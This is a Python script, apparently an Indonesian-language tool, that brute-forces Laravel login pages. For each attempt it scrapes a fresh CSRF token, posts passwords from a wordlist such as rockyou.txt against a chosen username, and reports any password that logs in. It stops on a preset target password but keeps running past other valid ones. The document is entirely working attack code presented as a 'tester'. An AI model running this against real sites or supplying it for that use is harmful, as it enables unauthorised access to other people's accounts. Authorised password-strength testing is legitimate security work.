import requests
from bs4 import BeautifulSoup
import time
import argparse

def run_targeted_brute_force(target_url, username, password_file, target_password):
    """
    Menjalankan tes brute force yang hanya berhenti ketika password target ditemukan.
    """
    LOGIN_FAILED_MESSAGE = "These credentials do not match our records"
    
    with requests.Session() as session:
        print("="*50)
        print("Targeted Brute Force Tester")
        print("="*50)
        print(f"[*] Target URL: {target_url}")
        print(f"[*] Target Username: {username}")
        print(f"[*] Wordlist File: {password_file}")
        print(f"[*] ONLY STOPPING on password: '{target_password}'")
        print("-"*50)

        attempt_count = 0
        
        try:
            with open(password_file, 'r', encoding='latin-1', errors='ignore') as f:
                for password in f:
                    password = password.strip()
                    if not password:
                        continue
                        
                    attempt_count += 1
                    
                    try:
                        login_page = session.get(target_url, timeout=10)
                        
                        if login_page.status_code != 200:
                            print(f"[!] Gagal mengakses halaman login. Status: {login_page.status_code}")
                            break

                        soup = BeautifulSoup(login_page.text, 'lxml')
                        csrf_token_input = soup.find('input', {'name': '_token'})
                        
                        if not csrf_token_input:
                            print("[!] Tidak dapat menemukan CSRF token. Pastikan URL benar.")
                            break
                        
                        csrf_token = csrf_token_input['value']

                        payload = {
                            'username': username,
                            'password': password,
                            '_token': csrf_token
                        }
                        
                        response = session.post(target_url, data=payload, timeout=10)
                        
                        if attempt_count % 1000 == 0:
                            print(f"[INFO] Uji coba ke-{attempt_count}. Mencoba password: '{password}'")

                        if LOGIN_FAILED_MESSAGE not in response.text:
                            if password == target_password:
                                print("\n" + "="*50)
                                print(f"[+] ==> SUKSES! Password TARGET '{target_password}' ditemukan!")
                                print(f"[+] Username: {username}")
                                print(f"[+] Password: {password}")
                                print(f"[+] Total percobaan: {attempt_count}")
                                print("="*50)
                                return
                            else:
                                print(f"\n[INFO] Menemukan password yang valid: '{password}', tapi bukan target. Melanjutkan pencarian...\n")

                    except requests.exceptions.RequestException as e:
                        print(f"\n[!] Error koneksi: {e}")
                        print("[!] Menunggu 10 detik sebelum mencoba lagi...")
                        time.sleep(10)
                        continue

        except FileNotFoundError:
            print(f"[!] FATAL ERROR: File password '{password_file}' tidak ditemukan.")
            return
        except Exception as e:
            print(f"[!] Terjadi error tak terduga: {e}")

    print(f"\n[!] Pengujian selesai. Password target '{target_password}' tidak ditemukan di dalam daftar.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Targeted Brute Force Tester for Laravel Login Pages.")
    parser.add_argument("url", help="URL lengkap dari halaman login target.")
    parser.add_argument("username", help="Username yang akan di-brute force.")
    parser.add_argument("wordlist", help="Path ke file wordlist (contoh: rockyou.txt).")
    parser.add_argument("--target-password", default="uwu123", help="Password spesifik yang dicari. Default: uwu123")
    
    args = parser.parse_args()
    
    run_targeted_brute_force(args.url, args.username, args.wordlist, args.target_password)
